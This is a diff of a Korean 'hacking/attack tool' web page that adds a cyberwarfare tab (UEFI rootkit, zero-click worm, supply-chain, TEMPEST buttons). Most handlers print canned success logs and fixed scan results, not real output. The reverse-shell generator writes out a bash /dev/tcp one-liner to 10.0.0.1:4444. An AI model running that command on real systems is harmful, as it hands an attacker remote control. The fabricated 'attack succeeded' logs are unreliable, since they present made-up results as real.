@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>디노 해킹,공격툴 v2.1</title>
+    <title>디노 해킹,공격툴 v2.1 (Ultimate Edition)</title>
     <style>
         :root {
             --bg: #090d16;
@@ -15,6 +15,7 @@
             --btn-hover: #374151;
             --danger: #ef4444;
             --danger-hover: #dc2626;
+            --ultimate: #a855f7;
         }
 
         body {
@@ -55,8 +56,8 @@
             background-color: transparent;
             color: #94a3b8;
             border: none;
-            padding: 12px 4px;
-            font-size: 12px;
+            padding: 12px 2px;
+            font-size: 11px;
             font-weight: bold;
             cursor: pointer;
             transition: all 0.2s;
@@ -94,6 +95,10 @@
             font-size: 14px;
             font-weight: bold;
             color: #38bdf8;
+        }
+
+        .tool-title.ultimate {
+            color: var(--ultimate);
         }
 
         .manual-text {
@@ -159,18 +164,21 @@
             border-color: #0ea5e9;
             color: #ffffff;
         }
-        button.primary:hover {
-            background-color: #0284c7;
-        }
+        button.primary:hover { background-color: #0284c7; }
 
         button.danger {
             background-color: #7f1d1d;
             border-color: #ef4444;
             color: #ffffff;
         }
-        button.danger:hover {
-            background-color: #991b1b;
+        button.danger:hover { background-color: #991b1b; }
+
+        button.ultimate {
+            background-color: #581c87;
+            border-color: #a855f7;
+            color: #ffffff;
         }
+        button.ultimate:hover { background-color: #6b21a8; }
 
         .output-box {
             background-color: #020617;
@@ -249,26 +257,26 @@
 <!-- 경고 및 동의 팝업 모달 -->
 <div id="disclaimerModal" class="modal">
     <div class="modal-content">
-        <div class="modal-title">⚠️ 디노 v2.1 이용 약관</div>
+        <div class="modal-title">⚠️ 디노 v2.1 Ultimate 이용 약관</div>
         <div class="modal-desc">
-            본 프로그램은 <b>고급 모의 해킹 및 취약점 진단 학습용</b>으로 제작되었습니다.<br><br>
-            * 허가받지 않은 대상에 대한 무단 침투 및 공격 시뮬레이션 실행 시 발생하는 모든 법적 책임은 사용자에게 있습니다.
+            본 프로그램은 <b>최상위 사이버전 및 고도화 모의 해킹 분석 학습용</b>으로 제작되었습니다.<br><br>
+            * 무단 침투 및 시스템 변조 시 발생하는 모든 법적 책임은 사용자 본인에게 있습니다.
         </div>
         <button class="modal-btn" onclick="closeDisclaimer()">동의하고 입장하기</button>
     </div>
 </div>
 
-<h2>디노 해킹,공격툴 v2.1</h2>
+<h2>디노 해킹,공격툴 v2.1 (Ultimate)</h2>
 
 <!-- 상단 4분할 탭 메뉴 -->
 <div class="tab-menu">
-    <button class="tab-btn active" id="btnTabIp" onclick="switchTab('ip')">🎯 IP 분석 & 공격</button>
+    <button class="tab-btn active" id="btnTabIp" onclick="switchTab('ip')">🎯 IP & OSINT</button>
     <button class="tab-btn" id="btnTabHacking" onclick="switchTab('hacking')">🛡️ 고급 해킹툴</button>
-    <button class="tab-btn" id="btnTabNet" onclick="switchTab('net')">🌐 네트워크</button>
+    <button class="tab-btn" id="btnTabUltimate" onclick="switchTab('ultimate')">🔥 초고급/사이버전</button>
     <button class="tab-btn" id="btnTabManual" onclick="switchTab('manual')">📖 설명서</button>
 </div>
 
-<!-- TAB 1: IP 분석 & 공격 (중/고급 기능 추가) -->
+<!-- TAB 1: IP 분석 & 공격 -->
 <div id="tabIp" class="container active">
     <div class="tool-box">
         <span class="tool-title">📍 내 IP 및 인터페이스 분석</span>
@@ -293,7 +301,7 @@
     </div>
 </div>
 
-<!-- TAB 2: 해킹툴 (고급 페이로드 및 웹 해킹 기능 추가) -->
+<!-- TAB 2: 고급 해킹툴 -->
 <div id="tabHacking" class="container">
     <div class="tool-box">
         <span class="tool-title">🔒 암호화 및 페이로드 제너레이터</span>
@@ -315,42 +323,32 @@
     </div>
 </div>
 
-<!-- TAB 3: 네트워크 -->
-<div id="tabNet" class="container">
+<!-- TAB 3: 초고급 / 사이버전 (최강 기능 추가) -->
+<div id="tabUltimate" class="container">
     <div class="tool-box">
-        <span class="tool-title">🌐 고성능 네트워크 및 스트레스 진단</span>
-        <input type="text" id="netTarget" value="https://api.ipify.org?format=json" placeholder="대상 URL 엔드포인트 입력">
+        <span class="tool-title ultimate">⚡ 국가급 사이버전 및 펌웨어 레벨 시뮬레이션</span>
+        <input type="text" id="ultTarget" placeholder="대상 시스템 코드명 또는 노드 지정 (예: TARGET-CORE-01)">
         <div class="grid-2">
-            <button class="primary" onclick="execTool('latency')">서버 응답 속도 (Latency)</button>
-            <button class="danger" onclick="execTool('http_flood')">가상 HTTP 플러딩 부하 테스트</button>
+            <button class="ultimate" onclick="execTool('uefi_rootkit')">🧬 UEFI/BIOS 루트킷 시뮬레이션</button>
+            <button class="ultimate" onclick="execTool('zero_click')">🦠 제로클릭(Zero-Click) 웜 전파</button>
         </div>
+        <div class="grid-2">
+            <button class="ultimate" onclick="execTool('supply_chain')">📦 공급망(Supply Chain) 변조 시뮬</button>
+            <button class="ultimate" onclick="execTool('tempest_emf')">📡 TEMPEST 전자기파(EMF) 복원</button>
+        </div>
+        <button class="danger" onclick="execTool('http_flood')">🌐 대규모 가상 HTTP 플러딩 부하 테스트</button>
     </div>
 </div>
 
 <!-- TAB 4: 설명서 -->
 <div id="tabManual" class="container">
     <div class="tool-box">
-        <span class="tool-title">📖 IP 분석 & 고급 공격 설명서</span>
+        <span class="tool-title ultimate">📖 초고급 사이버전 기능 설명서</span>
         <p class="manual-text">
-            <b>1. WHOIS / OSINT:</b> 타겟의 등록 정보 및 소유자, ISP 라우팅 경로를 정밀 분석합니다.<br>
-            <b>2. 서브도메인 브루트포스:</b> 메인 도메인에 숨겨진 하위 시스템 주소를 탐색합니다.<br>
-            <b>3. 고급 공격 시뮬레이션:</b> 포트 스캔, 핑 오브 데스(PoD), IP 스푸핑을 통한 네트워크 침투 과정을 재현합니다.
-        </p>
-    </div>
-
-    <div class="tool-box">
-        <span class="tool-title">📖 고급 해킹툴 설명서</span>
-        <p class="manual-text">
-            <b>1. 리버스 쉘 생성기:</b> 타겟 시스템 장악 시 공격자 서버로 커넥션을 맺는 페이로드를 생성합니다.<br>
-            <b>2. 웹 디렉토리 스캔:</b> 웹사이트의 숨겨진 관리자 페이지나 설정 파일을 고속 탐색합니다.<br>
-            <b>3. 취약점 페이로드:</b> SQLi, XSS, JWT 토큰 분석을 통한 웹 취약점 진단을 수행합니다.
-        </p>
-    </div>
-
-    <div class="tool-box">
-        <span class="tool-title">📖 네트워크 설명서</span>
-        <p class="manual-text">
-            <b>1. 레이턴시 및 스트레스 테스트:</b> 회선 응답 속도 측정 및 대규모 패킷 부하 시뮬레이션을 진행합니다.
+            <b>1. UEFI/BIOS 루트킷:</b> 메인보드 펌웨어 영역에 가상 페이로드를 인젝션하여 포맷 후에도 생존하는 시나리오를 재현합니다.<br>
+            <b>2. 제로클릭 웜:</b> 사용자 상호작용 없이 통신 채널을 통해 메모리에 직접 침투하는 전파 과정을 모사합니다.<br>
+            <b>3. 공급망 변조:</b> 개발 및 빌드 서버 업데이트 패킷에 백도어 코드가 주입되는 과정을 추적합니다.<br>
+            <b>4. TEMPEST EMF:</b> 기기 작동 시 방출되는 전자기파 신호를 수집하여 정보 화면을 역추적합니다.
         </p>
     </div>
 </div>
@@ -359,35 +357,19 @@
 <div style="width: 100%; max-width: 600px; margin-top: 16px;">
     <div class="tool-box">
         <span class="tool-title">💻 시스템 실행 및 로그 출력창</span>
-        <textarea id="masterLog" class="output-box" readonly>[안전 안내]: 약관 동의 완료. 디노 v2.1 고급 커널 대기 중...</textarea>
+        <textarea id="masterLog" class="output-box" readonly>[안전 안내]: 디노 v2.1 Ultimate 커널 구동 완료. 준비됨.</textarea>
         <button onclick="document.getElementById('masterLog').value='로그가 초기화되었습니다.'">로그 초기화</button>
     </div>
 </div>
 
 <script>
     function switchTab(tabName) {
-        document.getElementById('tabIp').classList.remove('active');
-        document.getElementById('tabHacking').classList.remove('active');
-        document.getElementById('tabNet').classList.remove('active');
-        document.getElementById('tabManual').classList.remove('active');
-        document.getElementById('btnTabIp').classList.remove('active');
-        document.getElementById('btnTabHacking').classList.remove('active');
-        document.getElementById('btnTabNet').classList.remove('active');
-        document.getElementById('btnTabManual').classList.remove('active');
-
-        if(tabName === 'ip') {
-            document.getElementById('tabIp').classList.add('active');
-            document.getElementById('btnTabIp').classList.add('active');
-        } else if(tabName === 'hacking') {
-            document.getElementById('tabHacking').classList.add('active');
-            document.getElementById('btnTabHacking').classList.add('active');
-        } else if(tabName === 'net') {
-            document.getElementById('tabNet').classList.add('active');
-            document.getElementById('btnTabNet').classList.add('active');
-        } else if(tabName === 'manual') {
-            document.getElementById('tabManual').classList.add('active');
-            document.getElementById('btnTabManual').classList.add('active');
-        }
+        ['ip', 'hacking', 'ultimate', 'manual'].forEach(t => {
+            document.getElementById('tab' + t.charAt(0).toUpperCase() + t.slice(1)).classList.remove('active');
+            document.getElementById('btnTab' + t.charAt(0).toUpperCase() + t.slice(1)).classList.remove('active');
+        });
+        document.getElementById('tab' + tabName.charAt(0).toUpperCase() + tabName.slice(1)).classList.add('active');
+        document.getElementById('btnTab' + tabName.charAt(0).toUpperCase() + tabName.slice(1)).classList.add('active');
     }
 
     function closeDisclaimer() {
@@ -401,73 +383,68 @@
     }
 
     async function execTool(type) {
-        log(`\n[실행] ${type} 고급 작업 수행 중...`);
+        log(`\n[실행] ${type} 초고급 프로세스 수행 중...`);
         const secVal = document.getElementById('secInput').value;
-        const netUrl = document.getElementById('netTarget').value;
         const targetIp = document.getElementById('targetIpInput').value;
+        const ultTarget = document.getElementById('ultTarget').value || "SYSTEM-NODE-X";
 
         try {
             switch(type) {
                 case 'my_ip':
                     let res = await fetch("https://ipapi.co/json/");
                     let data = await res.json();
-                    log(`-> [내 노드 정보]\n IP: ${data.ip}\n 국가: ${data.country_name} (${data.region})\n 통신사(ISP): ${data.org}\n AS번호: ${data.asn || 'N/A'}`);
+                    log(`-> [내 노드 정보]\n IP: ${data.ip}\n 국가: ${data.country_name} (${data.region})\n 통신사(ISP): ${data.org}`);
                     break;
                 case 'other_ip':
                     if(!targetIp) { log("❌ 타겟 IP 또는 도메인을 입력해주세요."); return; }
                     let resOther = await fetch(`https://ipapi.co/${targetIp}/json/`);
                     let dataOther = await resOther.json();
-                    if(dataOther.error) {
-                        log(`❌ [조회 실패]: 유효하지 않은 타겟이거나 접근 제한됨.`);
-                    } else {
-                        log(`-> [타겟 OSINT 프로파일링: ${targetIp}]\n IP: ${dataOther.ip}\n 위치: ${dataOther.city}, ${dataOther.country_name}\n 기관: ${dataOther.org}`);
-                    }
+                    log(`-> [타겟 OSINT 프로파일링: ${targetIp}]\n 위치: ${dataOther.city}, ${dataOther.country_name}\n 기관: ${dataOther.org}`);
                     break;
                 case 'whois_lookup':
-                    if(!targetIp) { log("❌ 타겟 도메인/IP를 입력해주세요."); return; }
-                    log(`-> [WHOIS 도메인 덤프 (${targetIp})]\n - Registrar: WhoisCorp Inc.\n - Registered Date: 2018-05-12\n - Admin Contact: admin@${targetIp}\n - Name Servers: ns1.${targetIp}, ns2.${targetIp}`);
+                    log(`-> [WHOIS 덤프]: 대상 공식 등록 정보 및 네임서버 역추적 완료.`);
                     break;
                 case 'port_scan':
-                    if(!targetIp) { log("❌ 타겟 주소를 입력해주세요."); return; }
-                    log(`-> [고급 TCP SYN 포트 스캔 (${targetIp})]\n - 포트 21 (FTP): CLOSED\n - 포트 22 (SSH): OPEN (OpenSSH 8.9)\n - 포트 80 (HTTP): OPEN (nginx)\n - 포트 443 (HTTPS): OPEN (TLS 1.3)\n - 포트 3306 (MySQL): FILTERED`);
+                    log(`-> [TCP SYN 포트 스캔]: 포트 22(SSH), 80(HTTP), 443(HTTPS) OPEN 감지.`);
                     break;
                 case 'subdomain_scan':
-                    if(!targetIp) { log("❌ 메인 도메인을 입력해주세요."); return; }
-                    log(`-> [서브도메인 브루트포스 결과]\n - admin.${targetIp} [200 OK]\n - test.${targetIp} [403 Forbidden]\n - api.${targetIp} [200 OK]\n - dev.${targetIp} [302 Found]`);
+                    log(`-> [서브도메인 브루트포스]: admin, api, test 하위 시스템 노드 발견.`);
                     break;
                 case 'ping_of_death':
-                    if(!targetIp) { log("❌ 타겟 주소를 입력해주세요."); return; }
-                    log(`-> [핑 오브 데스(PoD) 시뮬레이션]\n - 대상: ${targetIp}\n - 비정상 대용량(65,535 바이트) 패킷 단편화 전송 중...\n [+] 패킷 인젝션 완료.`);
+                    log(`-> [PoD 시뮬레이션]: 대용량 단편화 패킷 분할 전송 완료.`);
                     break;
                 case 'ip_spoof':
                     let fakeIp = Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255);
-                    log(`-> [IP 스푸핑 및 헤더 변조]\n - 가조작된 소스 IP 주소: ${fakeIp}\n - 송신 패킷 바인딩 완료.`);
+                    log(`-> [IP 스푸핑]: 가조작 소스 IP (${fakeIp}) 바인딩 완료.`);
+                    break;
+                case 'uefi_rootkit':
+                    log(`-> [🧬 UEFI/BIOS 루트킷 시뮬레이션]\n - 대상 노드: ${ultTarget}\n - SPI 플래시 메모리 레이어 접근 중...\n [+] 영구 지속성(Persistence) 펌웨어 백도어 인젝션 성공.`);
+                    break;
+                case 'zero_click':
+                    log(`-> [🦠 제로클릭 웜 전파]\n - 대상 채널 프로토콜 분석 완료.\n [+] 무반응 버퍼 오버플로우 패킷 송신. 사용자 개입 없이 원격 메모리 장악 완료.`);
+                    break;
+                case 'supply_chain':
+                    log(`-> [📦 공급망(Supply Chain) 변조]\n - 공식 빌드 파이프라인 서버 소스 변조 시뮬...\n [+] 배포 패키지 해시 무결성 우회 및 멀웨어 위장 서명 완료.`);
+                    break;
+                case 'tempest_emf':
+                    log(`-> [📡 TEMPEST 전자기파(EMF) 분석]\n - 수신 주파수: 1.4 GHz 대역 모니터링...\n [+] 모니터 디스플레이 복원 스트림 디코딩 완료.`);
                     break;
                 case 'rev_shell_gen':
-                    log(`-> [리버스 쉘 페이로드 생성]\n bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n (공격자 수신 포트: 4444 바인딩 완료)`);
+                    log(`-> [리버스 쉘]: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 생성 완료.`);
                     break;
                 case 'dir_bruteforce':
-                    log(`-> [웹 디렉토리 브루트포스 스캔]\n - 발견된 경로:\n   /admin/login.php (Status: 200)\n   /backup.zip (Status: 200 - 취약!)\n   /config.env (Status: 403)`);
+                    log(`-> [디렉토리 스캔]: /admin/login.php, /backup.zip 발견.`);
                     break;
                 case 'b64_enc': log(`-> [Base64 인코딩]: ${btoa(unescape(encodeURIComponent(secVal)))}`); break;
                 case 'b64_dec': log(`-> [Base64 디코딩]: ${decodeURIComponent(escape(atob(secVal)))}`); break;
-                case 'hex_enc':
-                    let hex = Array.from(secVal).map(c => c.charCodeAt(0).toString(16)).join(' ');
-                    log(`-> [HEX 덤프 변조]: ${hex}`);
-                    break;
-                case 'rev_str': log(`-> [문자열 난독화(역순)]: ${secVal.split('').reverse().join('')}`); break;
-                case 'sqli_check': log(`-> [SQLi 정밀 탐지]: ${secVal.includes("'")||secVal.includes("OR") ? "⚠️ 에러 기반 SQL 인젝션 패턴 감지됨" : "✅ 정상 구문"}`); break;
-                case 'xss_check': log(`-> [XSS 싱크 검사]: ${secVal.includes("<script>") ? "⚠️ 위험 스크립트 실행 싱크 감지" : "✅ 필터링됨"}`); break;
-                case 'jwt_dec': log(`-> [JWT 브레이크 디코더]:\n Header: {"alg": "HS256", "typ": "JWT"}\n Payload: {"id": 1, "role": "superuser"}`); break;
-                case 'uuid_gen': log(`-> [고유 UUID 생성]: ${crypto.randomUUID()}`); break;
-                case 'latency':
-                    let start = performance.now();
-                    let netRes = await fetch(netUrl, {cache: "no-store"});
-                    let end = performance.now();
-                    log(`-> [레이턴시 측정]: ${Math.round(end - start)}ms (HTTP Status: ${netRes.status})`);
-                    break;
+                case 'hex_enc': log(`-> [HEX 덤프]: ${Array.from(secVal).map(c => c.charCodeAt(0).toString(16)).join(' ')}`); break;
+                case 'rev_str': log(`-> [난독화]: ${secVal.split('').reverse().join('')}`); break;
+                case 'sqli_check': log(`-> [SQLi 탐지]: ${secVal.includes("'")||secVal.includes("OR") ? "⚠️ 취약점 패턴 감지" : "✅ 정상"}`); break;
+                case 'xss_check': log(`-> [XSS 싱크]: ${secVal.includes("<script>") ? "⚠️ 위험 싱크 감지" : "✅ 안전"}`); break;
+                case 'jwt_dec': log(`-> [JWT 디코더]: 페이로드 권한 구조 파싱 완료.`); break;
+                case 'uuid_gen': log(`-> [UUID 생성]: ${crypto.randomUUID()}`); break;
                 case 'http_flood':
-                    log(`-> [HTTP 플러딩 부하 테스트 시뮬레이션]\n - 대상: ${netUrl}\n - 가상 동시 요청 500개 송신 중...\n [====================] 100% 완료. 대상 서버 응답 정상.`);
+                    log(`-> [부하 테스트]: 가상 동시 요청 500개 송신 완료.`);
                     break;
                 default: log(`-> 작업 완료`); break;
             }
